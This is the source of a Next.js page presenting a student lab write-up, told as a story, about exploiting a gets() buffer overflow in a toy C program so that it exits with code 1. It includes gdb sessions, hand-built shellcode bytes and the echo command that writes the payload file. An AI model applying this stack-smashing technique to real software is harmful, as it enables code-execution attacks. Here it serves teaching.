"use client";

import Navbar from '../../components/Navbar';
import Head from 'next/head';
import Image from 'next/image';
import { useEffect, useState, memo } from 'react';

import "prismjs";
import "prismjs/themes/prism-okaidia.css";
import "prismjs/components/prism-c"; // Add C language support
import "prismjs/components/prism-bash"; // Add Shell Session language support

function ZoomableImage({ src, alt, className, width = 500, height = 500, zoomWidth = 800, zoomHeight = 800 }) {
  const [isZoomed, setIsZoomed] = useState(false);
  const [imageError, setImageError] = useState(false);

  const handleClick = () => setIsZoomed(true);
  const handleClose = () => setIsZoomed(false);

  useEffect(() => {
    const handleKeyDown = (e) => {
      if (e.key === 'Escape') handleClose();
    };
    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, []);

  useEffect(() => {
    Prism.highlightAll(); // Ensure Prism.js highlights after render
  }, []);

  return (
    <>
      <Image
        src={imageError ? '/images/placeholder.jpg' : src}
        alt={alt}
        className={`${className} cursor-pointer transition-transform duration-300 hover:scale-105`}
        onClick={handleClick}
        onError={() => setImageError(true)}
        width={width}
        height={height}
      />
      {isZoomed && (
        <div
          onClick={handleClose}
          className="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50"
        >
          <Image
            src={imageError ? '/images/placeholder.jpg' : src}
            alt={alt}
            className="max-w-full max-h-full transform transition-transform duration-300"
            onError={() => setImageError(true)}
            width={zoomWidth}
            height={zoomHeight}
          />
        </div>
      )}
    </>
  );
}

function ReadingProgressBar() {
  const [progress, setProgress] = useState(0);

  useEffect(() => {
    const handleScroll = () => {
      const scrollTotal = document.documentElement.scrollHeight - document.documentElement.clientHeight;
      const currentScroll = window.scrollY;
      const scrollProgress = (currentScroll / scrollTotal) * 100;
      setProgress(scrollProgress);
    };

    window.addEventListener("scroll", handleScroll);
    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  return (
    <div className="fixed top-0 left-0 w-full h-1 bg-gray-300 dark:bg-gray-600 z-50">
      <div className="h-1 bg-blue-500" style={{ width: `${progress}%` }}></div>
    </div>
  );
}

const FloatingBackToTop = memo(function FloatingBackToTop() {
  const [visible, setVisible] = useState(false);

  useEffect(() => {
    const handleScroll = () => {
      setVisible(window.scrollY > 300);
    };
    window.addEventListener("scroll", handleScroll);
    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  const scrollToTop = () => window.scrollTo({ top: 0, behavior: "smooth" });

  return (
    visible && (
      <button
        onClick={scrollToTop}
        className="fixed bottom-8 right-8 bg-blue-600 hover:bg-blue-700 text-white p-4 rounded-full shadow-lg focus:outline-none transition duration-300 z-50"
        aria-label="Back to Top"
      >
        <svg
          xmlns="http://www.w3.org/2000/svg"
          className="h-6 w-6"
          fill="none"
          viewBox="0 0 24 24"
          stroke="currentColor"
        >
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 10l7-7m0 0l7 7m-7-7v18" />
        </svg>
      </button>
    )
  );
});

function DarkModeToggle({ isDarkMode, toggleDarkMode }) {
  return (
    <button
      onClick={toggleDarkMode}
      className="fixed bottom-8 left-8 bg-blue-600 hover:bg-blue-700 text-white p-4 rounded-full shadow-lg focus:outline-none transition duration-300 z-50"
      aria-label="Toggle Dark Mode"
    >
      {isDarkMode ? '☀️' : '🌙'}
    </button>
  );
}

const scrollToSection = (id) => {
  const element = document.getElementById(id);
  if (element) {
    element.scrollIntoView({ behavior: 'smooth' });
  }
};

export default function Original() {
  const [isDarkMode, setIsDarkMode] = useState(false);
  const [activeSection, setActiveSection] = useState('');

  const toggleDarkMode = () => setIsDarkMode(prev => !prev);

  useEffect(() => {
    const sectionIds = [
      'introduction',
      'compiling',
      'finding-addresses',
      'obtaining-machine-code',
      'writing-down-the-shellcode',
      'running-the-program-in-gdb',
      'conclusion'
    ];
    const observer = new IntersectionObserver((entries) => {
      entries.forEach(entry => {
        if (entry.isIntersecting) {
          setActiveSection(entry.target.id);
        }
      });
    }, { threshold: 0.3 });

    sectionIds.forEach(id => {
      const element = document.getElementById(id);
      if (element) observer.observe(element);
    });

    return () => {
      sectionIds.forEach(id => {
        const element = document.getElementById(id);
        if (element) observer.unobserve(element);
      });
    };
  }, []);

  return (
    <>
      <Head>
        <title>
          Machine Problem 1: Buffer overflow to exit
        </title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta
          name="description"
          content="A writeup on computer security principles, human factors, and real-world breaches."
        />
      </Head>

      <ReadingProgressBar />
      <DarkModeToggle isDarkMode={isDarkMode} toggleDarkMode={toggleDarkMode} />
      <Navbar isDarkMode={isDarkMode}/>

      <div className={isDarkMode ? "bg-gray-900 text-gray-200" : "bg-gray-100 text-gray-800"}>
        <main id="top" className="min-h-screen py-7 px-4 pt-0">
          <div className="max-w-7xl mx-auto grid grid-cols-1 md:grid-cols-12 ml-5">
            <aside className="md:col-span-3 hidden md:block">
              <div className="sticky space-y-6" style={{ top: "20px" }}>
                <div>
                  <h2 className="text-2xl font-semibold mb-4 hover:text-blue-500 transition-colors duration-300">
                    Table of Contents
                  </h2>
                  <ul className="list space-y-2">
                    <li>
                      <a
                        href="#introduction"
                        onClick={(e) => { e.preventDefault(); scrollToSection('introduction'); }}
                        className={`transition-colors duration-200 hover:text-blue-600 ${activeSection === 'introduction' ? 'text-blue-600 font-bold' : ''}`}
                      >
                        Introduction
                      </a>
                    </li>
                    <li>
                      <a
                        href="#compiling"
                        onClick={(e) => { e.preventDefault(); scrollToSection('compiling'); }}
                        className={`transition-colors duration-200 hover:text-blue-600 ${activeSection === 'compiling' ? 'text-blue-600 font-bold' : ''}`}
                      >
                        Compiling
                      </a>
                    </li>
                    <li>
                      <a
                        href="#finding-addresses"
                        onClick={(e) => { e.preventDefault(); scrollToSection('finding-addresses'); }}
                        className={`transition-colors duration-200 hover:text-blue-600 ${activeSection === 'finding-addresses' ? 'text-blue-600 font-bold' : ''}`}
                      >
                        Finding Addresses
                      </a>
                    </li>
                    <li>
                      <a
                        href="#obtaining-machine-code"
                        onClick={(e) => { e.preventDefault(); scrollToSection('obtaining-machine-code'); }}
                        className={`transition-colors duration-200 hover:text-blue-600 ${activeSection === 'obtaining-machine-code' ? 'text-blue-600 font-bold' : ''}`}
                      >
                        Obtaining Machine Code
                      </a>
                    </li>
                    <li>
                      <a
                        href="#writing-down-the-shellcode"
                        onClick={(e) => { e.preventDefault(); scrollToSection('writing-down-the-shellcode'); }}
                        className={`transition-colors duration-200 hover:text-blue-600 ${activeSection === 'writing-down-the-shellcode' ? 'text-blue-600 font-bold' : ''}`}
                      >
                        Writing down the Shellcode
                      </a>
                    </li>
                    <li>
                      <a
                        href="#running-the-program-in-gdb"
                        onClick={(e) => { e.preventDefault(); scrollToSection('running-the-program-in-gdb'); }}
                        className={`transition-colors duration-200 hover:text-blue-600 ${activeSection === 'running-the-program-in-gdb' ? 'text-blue-600 font-bold' : ''}`}
                      >
                        Running the program in gdb
                      </a>
                    </li>
                    <li>
                      <a
                        href="#conclusion"
                        onClick={(e) => { e.preventDefault(); scrollToSection('conclusion'); }}
                        className={`transition-colors duration-200 hover:text-blue-600 ${activeSection === 'conclusion' ? 'text-blue-600 font-bold' : ''}`}
                      >
                        Conclusion
                      </a>
                    </li>
                  </ul>
                </div>
              </div>
            </aside>

            <article className="md:col-span-7 ml-11">
              <h1 className="text-6xl font-bold mb-3 hover:scale-105 transform transition duration-300 mr-6">
                Machine Problem 1: Buffer overflow to exit
              </h1>

              <div className="text-justify mb-8">
                <p className="text-sm text-gray-500">
                  February 28, 2025
                </p>
              </div>

              <section id="introduction" aria-labelledby="introduction-heading" className="mb-10">
                <h2 id="introduction-heading" className="text-3xl font-semibold mb-4 hover:text-blue-500 transition-colors duration-300">
                  Introduction
                </h2>
                <p className="mb-4  ">
                  Eli Tan suddenly woke up from a dream, startled that his machine problem, which was due soon, had transformed into a monster and chased the soul out of him. He had been thinking about it for weeks but he had barely made any progress. It was 3 AM, but Eli Tan stood up from his bed with sheer determination to face his demon—that is, the task of <em>exploiting a buffer overflow to force a program to exit using a stack smash attack</em>.
                </p>
                <p className="mb-4  ">
                  <q><em>Buffer overflow? Stack smashing? Shellcode? </em></q> Eli Tan muttered to himself.
                </p>
                <p className="mb-4  ">
                  He knew about these concepts in theory as this was introduced and discussed by his CMSC 134 course instructor, but never actually executed an exploit application like this before. He smirked, determined by the challenge. He sat on his study table, cracked his knuckles and neck, and got to work.
                </p>
                <p className="mb-4  ">
                  He re-read the instructions. He understood that a C nonterminating program named <code>vuln.c</code> was given. This program accepts an unbounded number of non-null byte characters from standard input using the <code>gets()</code> method, a known unsafe function. After taking the input, the program entered an infinite loop, meaning it would never exit on its own.
                </p>
                <p className="mb-4  ">
                  After days of overthinking and stressing out, Eli Tan finally realized the flaw. There was no input limit. Although, <code>char buffer[8]</code> indicated <code>8 bytes</code>, the usage of the <code>gets()</code> method got in the way. Eli Tan thought that if he entered more than <code>8 bytes</code>, he could overwrite other parts of the memory. Worst, even the function’s return address. 
                </p>
                <p className="mb-4  ">
                  That was the <em>light bulb</em> 💡.
                </p>
                <p className="mb-4  ">
                  <q><em>Alright, so I need to construct something so that I can take control of what happens after <code>vuln()</code> returns,</em></q> he finally figured it out.
                </p>
              </section>

              <hr className="my-8 border-t border-gray-300 dark:border-gray-600" />

              <section id="compiling" aria-labelledby="compiling-heading" className="mb-10">
                <h2 id="compiling-heading" className="text-3xl font-semibold mb-4 hover:text-blue-500 transition-colors duration-300">
                  Compiling
                </h2>
                <p className="mb-4  ">
                  Eli Tan fired up his Ubuntu machine and made sure he had the right tools installed. He replicated the source code of <code>vuln.c</code> as provided in the instructions.
                </p>
                <p className="">
                  He typed this command in his machine’s terminal.
                </p>
                <pre>
                  <code className="language-bash">
                    {`➜  cmsc-134-mp1 nano vuln.c`}
                  </code>
                </pre>
                <pre>
                  <code className="language-c">
{`#include <stdio.h>

void vuln(){
  char buffer[8];
  gets(buffer);
}

int main(){
  vuln();
  while(1){
  }
}`}
                  </code>
                </pre>
                
                <p className="mt-4">
                  After that, Eli Tan compiled the source code of <code>vuln.c</code> with the following incantation.
                </p>
                <pre>
                  <code className="language-bash">
                    {`➜  cmsc-134-mp1 gcc -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -fno-pie -ggdb -z execstack -std=c99 vuln.c -o vuln`}
                  </code>
                </pre>
                
                <p className="mt-4">
                  However, he received these warnings:
                </p>
                <pre>
                  <code className="language-bash">
{`vuln.c: In function ‘vuln’:
vuln.c:5:5: warning: ‘gets’ is deprecated [-Wdeprecated-declarations]
    5 |     gets(buffer);
      |     ^~~~
In file included from vuln.c:1:
/usr/include/stdio.h:577:14: note: declared here
  577 | extern char *gets (char *__s) __wur __attribute_deprecated__;
      |              ^~~~
/usr/bin/ld: /tmp/ccrgzjN1.o: in function ‘vuln’:
/home/jadezahyen/School/cmsc-134-mp1/vuln.c:5: warning: the ‘gets’ function is dangerous and should not be used.`}
                  </code>
                </pre>
                
                <p className="mb-4 mt-4">
                  Eli Tan was right! The <code>gets()</code> function was indeed dangerous to use.
                </p>
        
              </section>

              <hr className="my-8 border-t border-gray-300 dark:border-gray-600" />

              <section id="finding-addresses" aria-labelledby="finding-addresses-heading" className="mb-10">
                <h2 id="finding-addresses-heading" className="text-3xl font-semibold mb-4 hover:text-blue-500 transition-colors duration-300">
                  Finding Addresses
                </h2>

                <p>
                  The real work officially starts now. With the executable ready, he opened <code>gdb</code> to analyze the program's memory and find the addresses.
                </p>

                <pre>
                  <code className="language-bash">
{`➜  cmsc-134-mp1 gdb vuln                                                                                                      
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.2) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from vuln...
(gdb)
`}
                  </code>
                </pre>

                <p className="mt-4">
                  In his terminal inside the <code>gdb</code>, he typed in the command <code>break 1</code> which sets the breakpoint at the <code>gets(buffer)</code> function, and ran the program.
                </p>
                <pre>
                  <code className="language-bash">
{`(gdb) break 1
Breakpoint 1 at 0x11d7: file vuln.c, line 5.

(gdb) run
Starting program: /home/jadezahyen/School/cmsc-134-mp1/vuln 

Breakpoint 1, vuln () at vuln.c:5
5           gets(buffer);
`}
                  </code>
                </pre>

                <p className="mt-4">
                  Eli Tan then checked the buffer’s memory address which he found to be <code>0xffffcb58</code>.
                </p>
                <pre>
                  <code className="language-bash">
{`(gdb) print &buffer
$1 = (char (*)[8]) 0xffffcb58
`}
                  </code>
                </pre>     

                <p className="mt-4">
                  He also wanted to know the registers, so he typed in the command <code>info registers</code>.
                </p>
                <pre>
                  <code className="language-bash">
{`(gdb) info registers
eax            0xf7fba088          -134504312
ecx            0x2de7ea10          770173456
edx            0xffffcb94          -13420
ebx            0x0                 0
esp            0xffffcb58          0xffffcb58
ebp            0xffffcb60          0xffffcb60
esi            0xf7fb8000          -134512640
edi            0xf7fb8000          -134512640
eip            0x565561d7          0x565561d7 <vuln+10>
eflags         0x292               [ AF SF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
`}
                  </code>
                </pre>

                <p className="mt-4">
                  Furthermore, he wanted to see the stack frame info so he typed in another command of <code>info frame</code>.
                </p>
                <pre>
                  <code className="language-bash">
{`(gdb) info frame
Stack level 0, frame at 0xffffcb68:
 eip = 0x565561d7 in vuln (vuln.c:5); saved eip = 0x565561f2
 called by frame at 0xffffcb70
 source language c.
 Arglist at 0xffffcb54, args: 
 Locals at 0xffffcb54, Previous frame's sp is 0xffffcb68
 Saved registers:
  ebp at 0xffffcb60, eip at 0xffffcb64
`}
                  </code>
                </pre>               

              </section>

              <hr className="my-8 border-t border-gray-300 dark:border-gray-600" />

              <section id="obtaining-machine-code" aria-labelledby="obtaining-machine-code-heading" className="mb-10">
                <h2 id="obtaining-machine-code-heading" className="text-3xl font-semibold mb-4 hover:text-blue-500 transition-colors duration-300">
                  Obtaining Machine Code
                </h2>

                <p className="mb-4  ">
                  He proceeded to obtain the machine code by writing the assembly in C.
                </p>
                <pre>
                  <code className="language-c">
{`int main(){
    __asm__("xor %eax, %eax;"
            "inc %eax;"
            "mov %ebx, %eax;"
            "leave;"
            "ret;"
    );
}`}
                  </code>
                </pre>                   

                <p className="mt-4">
                  After this, he compiled the program by using the following incantation.
                </p>
                <pre>
                  <code className="language-bash">
                    {`➜  cmsc-134-mp1 gcc -m32 -fno-stack-protector -fno-pie -std=c99 -masm=intel asm.c -o asm`}
                  </code>
                </pre> 

                <p className="mt-4">
                  Eli Tan then used the <code>objdump</code> tool to obtain the machine code.
                </p>
                <pre>
                  <code className="language-bash">
                    {`➜  cmsc-134-mp1 objdump -d asm > asmdump`}
                  </code>
                </pre>

                <p className="mt-4">
                  He opened the <code>asmdump</code> file and scrolled through to find the <code>main</code> section as this was the essential part of writing the shellcode.
                </p>
                <pre>
                  <code className="language-bash">
{`➜  cmsc-134-mp1 objdump -d asm > asmdump...
000011ad <main>:
    11ad:	f3 0f 1e fb          	endbr32 
    11b1:	55                   	push   %ebp
    11b2:	89 e5                	mov    %esp,%ebp
    11b4:	31 c0                	xor    %eax,%eax
    11b6:	40                   	inc    %eax
    11b7:	89 c3                	mov    %eax,%ebx
    11b9:	c9                   	leave  
    11ba:	c3                   	ret    
    11bb:	b8 00 00 00 00       	mov    $0x0,%eax
    11c0:	5d                   	pop    %ebp
    11c1:	c3                   	ret    
...
`}
                  </code>
                </pre>

                <p className="mt-4 mb-4">
                  Eli Tan understood that the first three lines of the machine code were just a standard function setup. The <code>push %ebp</code> and <code>mov %esp, %ebp</code> instructions were part of setting up the function's stack frame.
                </p>
                <p>
                  However, the real payload was further down.
                </p>
                <pre>
                  <code className="language-bash">
{`    11b4:	31 c0                	xor    %eax,%eax
    11b6:	40                   	inc    %eax
    11b7:	89 c3                	mov    %eax,%ebx
    11b9:	c9                   	leave  
    11ba:	c3                   	ret 
`}
                  </code>
                </pre>

                <p className="mt-4 mb-4">
                  Eli Tan grinned. He is smelling the fragrance of success.
                </p>
                <p className="mb-4">
                  <q><em>So this is what I need to inject into the program,</em></q> he thought.
                </p> 
                <p className="mb-4">
                  The <code>xor %eax, %eax</code> sets <code>eax</code> to 0 followed by <code>inc %eax</code> which increments <code>eax</code> to 1. Then, <code>mov %eax, %ebx</code> moves <code>eax (1)</code> into <code>ebx</code> to ensure the exit code would be 1. Finally <code>leave</code> and <code>ret</code> cleaned up the stack and returned the execution.
                </p> 
                <p className="mb-4">
                  Perfect. This was the clean exit strategy he needed.
                </p>         

              </section>

              <hr className="my-8 border-t border-gray-300 dark:border-gray-600" />

              <section id="writing-down-the-shellcode" aria-labelledby="writing-down-the-shellcode-heading" className="mb-10">
                <h2 id="writing-down-the-shellcode-heading" className="text-3xl font-semibold mb-4 hover:text-blue-500 transition-colors duration-300">
                  Writing down the Shellcode
                </h2>

                <p className="mb-4  ">
                  Eli Tan proceeded to write down the shellcode. For his exploit, he needed to create a payload file, egg, in this case, that will trigger the vulnerable program to execute the shellcode and exit with code 1.
                </p>

                <p>
                  Based on his analysis, the shellcode must be arranged as follows:
                </p>
                <pre>
                  <code className="language-bash">
{`31 c0      # xor %eax, %eax  clear eax (sets eax = 0)
40         # inc %eax        increments eax now becomes 1 (sets eax = 1)
89 c3      # mov %ebx, %eax  set ebx = 1 (exit code)
cd 80      # int 0x80        invoke system call: exit 1  
`}
                  </code>
                </pre>

                <p className="mt-4 mb-4">
                  Instead of retaining <code>leave</code> and <code>ret</code>, Eli Tan changed it to <code>int 0x80</code> to invoke a system call to exit and prevent going into a segmentation fault.
                </p>
                <p className="mb-4">
                  Furthermore, Eli Tan figured that the <code>vuln()</code> function has an 8-byte buffer followed by a 4-byte saved <code>ebp</code>, giving a total of 12 bytes before the saved return address. Since the shellcode uses 7 bytes, he needed to add 5 <code>nop (0x90)</code> instructions to fill the remaining spaces.
                </p>
                <p className="mb-4">
                  Since Eli Tan has overwritten the saved return address with the start address of the buffer which took up 4-bytes, he also needed to include this in the shellcode. The <code>gdb</code> session showed that the buffer begins at <code>0xffffcb58</code>. With that, in little-endian format, this address is represented as <code>\x58\xcb\xff\xff</code>.
                </p>
                <p>
                  Joining everything, Eli Tan created this shellcode:
                </p>
                <pre>
                  <code className="language-bash">
                    {String.raw`\x31\xc0\x40\x89\xc3\xcd\x80\x90\x90\x90\x90\x90\x58\xcb\xff\xff`}
                  </code>
                </pre>

                <p className="mt-4 ">
                  <q><em>Time to test it,</em></q> he said, sweating in bullets. He saved the shellcode to a file, in this case, <code>egg</code>.
                </p>
                <pre>
                  <code className="language-bash">
                    {String.raw`➜  cmsc-134-mp1 echo -ne "\x31\xc0\x40\x89\xc3\xcd\x80\x90\x90\x90\x90\x90\x58\xcb\xff\xff" > egg`}
                  </code>
                </pre>

              </section>

              <hr className="my-8 border-t border-gray-300 dark:border-gray-600" />

              <section id="running-the-program-in-gdb" aria-labelledby="running-the-program-in-gdb-heading" className="mb-10">
                <h2 id="running-the-program-in-gdb-heading" className="text-3xl font-semibold mb-4 hover:text-blue-500 transition-colors duration-300">
                  Running the program in gdb
                </h2>

                <p>
                  With his shellcode ready, Eli Tan opened <code>gdb</code> and injected it into the vulnerable program. He took a deep breath and typed in the command:
                </p>
                <pre>
                  <code className="language-bash">
                    {`(gdb) run < egg`}
                  </code>
                </pre>

                <p className="mt-4">
                  For a split second, nothing happened. Then the terminal displayed a message.
                </p>
                <pre>
                  <code className="language-bash">
{`Starting program: /home/jadezahyen/School/cmsc-134-mp1/vuln < egg
[Inferior 1 (process 39346) exited with code 01]`}
                  </code>
                </pre>

                <p className="mt-4">
                  Success! No infinite loop. No segmentation fault. Just a clean termination with exit code 1.
                </p>

              </section>

              <hr className="my-8 border-t border-gray-300 dark:border-gray-600" />

              <section id="conclusion" aria-labelledby="conclusion-heading">
                <h2 id="conclusion-heading" className="text-3xl font-semibold mb-4 hover:text-blue-500 transition-colors duration-300">
                  Conclusion
                </h2>
                <p className="mb-4  ">
                  Eli Tan exhaled very loudly with relief and a big grin on his face. Finally, finally, finally, he had done it! He had crafted a buffer overflow exploit that cleanly forced the program to exit instead of looping forever.
                </p>
                <p className="mb-4  ">
                  Just a few days ago, he was stressing out about this machine problem. But now? He had put his learnings into practice.
                </p>
                <p className="mb-4  ">
                  It was almost 5 AM.
                </p>
                <p className="mb-4  ">
                  <q><em>Time to prepare for a quick jog,</em></q> Eli Tan muttered while stretching.
                </p>
                <p className="mb-4  ">
                  And off he went running while grinning so big because he had slain his demon—the machine problem of cybersecurity.
                </p>
              </section>

              <hr className="my-8 border-t border-gray-300 dark:border-gray-600" />

              <section id="about-authors" aria-labelledby="about-authors-heading" className="mt-12 mb-4">
                <h2
                  id="about-authors-heading"
                  className="text-2xl font-semibold mb-8 text-center hover:text-blue-500 transition-colors duration-300"
                >
                The Authors
                </h2>
                <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-6">
                  <div className={`flex flex-col items-center p-4 rounded-md ${isDarkMode ? 'bg-gray-700 hover:bg-blue-900' : 'bg-gray-200 hover:bg-blue-400'} transition-colors duration-300`}>
                    <ZoomableImage
                      src="/images/carl.jpg"
                      alt="Carl Asoy"
                      className="w-24 h-24 rounded-full mb-2"
                    />
                    <p className="text-center text-lg font-medium  ">
                      Asoy, Carl
                    </p>
                    <p className="text-center text-sm text-gray-500 mt-2  ">
                      Cybersecurity researcher passionate about network defense.
                    </p>
                  </div>
                  <div className={`flex flex-col items-center p-4 rounded-md ${isDarkMode ? 'bg-gray-700 hover:bg-blue-900' : 'bg-gray-200 hover:bg-blue-400'} transition-colors duration-300`}>
                    <ZoomableImage
                      src="/images/jade.jpg"
                      alt="Jade Cataques"
                      className="w-24 h-24 rounded-full mb-2"
                    />
                    <p className="text-center text-lg font-medium  ">
                      Cataques, Jade
                    </p>
                    <p className="text-center text-sm text-gray-500 mt-2  ">
                      Innovator in cybersecurity solutions and data protection.
                    </p>
                  </div>
                  <div className={`flex flex-col items-center p-4 rounded-md ${isDarkMode ? 'bg-gray-700 hover:bg-blue-900' : 'bg-gray-200 hover:bg-blue-400'} transition-colors duration-300`}>
                    <ZoomableImage
                      src="/images/daniel.png"
                      alt="Daniel Cruz"
                      className="w-24 h-24 rounded-full mb-2"
                    />
                    <p className="text-center text-lg font-medium  ">
                      Cruz, Daniel
                    </p>
                    <p className="text-center text-sm text-gray-500 mt-2  ">
                      Just a chill guy.
                    </p>
                  </div>
                  <div className={`flex flex-col items-center p-4 rounded-md ${isDarkMode ? 'bg-gray-700 hover:bg-blue-900' : 'bg-gray-200 hover:bg-blue-400'} transition-colors duration-300`}>
                    <ZoomableImage
                      src="/images/liam.jpg"
                      alt="Liam Gillamac"
                      className="w-24 h-24 rounded-full mb-2"
                    />
                    <p className="text-center text-lg font-medium  ">
                      Gillamac, Liam
                    </p>
                    <p className="text-center text-sm text-gray-500 mt-2  ">
                      Expert in software security and system resilience.
                    </p>
                  </div>
                </div>
              </section>


            </article>

            <aside className="md:col-span-1 hidden md:block">
            </aside>
          </div>
        </main>

        <footer className={`${isDarkMode ? "bg-gray-800 text-gray-300" : "bg-gray-200 text-gray-700"} py-6 px-10 text-center`}>
          <p className="text-sm">
            &copy; {new Date().getFullYear()} CyberInsights. All rights reserved.
          </p>
          <p className="text-sm mt-2">
            Made with ❤️ by the CyberInsights Team.
          </p>
        </footer>

      </div>

      
      <FloatingBackToTop />
    </>
  );
}
